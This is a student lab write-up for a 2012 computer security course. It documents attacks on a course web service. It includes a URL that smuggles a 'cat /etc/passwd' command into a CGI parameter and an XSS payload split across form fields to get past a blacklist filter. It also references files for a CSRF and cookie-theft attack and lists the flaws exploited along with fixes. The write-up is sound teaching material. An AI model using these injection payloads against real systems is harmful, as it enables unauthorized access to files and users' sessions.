CIS551, Computing and Network Security, Spring 2012
Chris Imbriano and Dustin Zelle
April 24, 2011

* Attacks carried out using FireFox 11.0

A)
  The Attack)
    http://<IP>/cgi-bin/web-ls.cgi?dir=html%20%3E%20%2Fdev%2Fnull%3Bcat%20%2Fetc%2Fpasswd
  
  The Fix)
    web-ls-safe.cgi is included.

B) 
    Name: <script type="text/javascript">/*
    Street 1: */alert/*
    Street 2: */("Javascript successfully injected!");/*
    City: */</script >
    State:
    Zip Code:

    * The text "<script>" and "</script>" are removed server-side to protect against a XSS attack;
      we instead use "<script type="text/javascript>" and "</script >".
    * There is a 45 character limit per field client side; we separated the attack across multiple
      fields.
    * Fields have "<br>" tags inserted between them on the confirmation page; we used javascript
      comments so the javascript engine would ignore them.
    
    * The entire attack was carried out without viewing any of the server side code.
    * We viewed source on the client side only.

C)
  The Attack) 
    service-attack.html and steal.cgi are included.

  Security Flaws)
    * Code injection protection was very weak.  Used black-listing technique for user input sanitation.
        - Subverting the protection merely required adding an extra space to the <script> tag
    * Keeping the session token in plain text in the cookie is unadvisable
    * Not checking the HTTP referer allowed the CSRF
    * Cookie is not assigned a value for the Expires field
        - Cookie should expire within some reasonable time limit to protect user from long-term CSRF
    * Entire service including login takes place over HTTP instead of HTTPS
    * Username and Token need not be both in the cookie
        - Server could map token to user data
    * Server doesn't validate critical actions taken by forms
        - Server could issue action token when generating HTML forms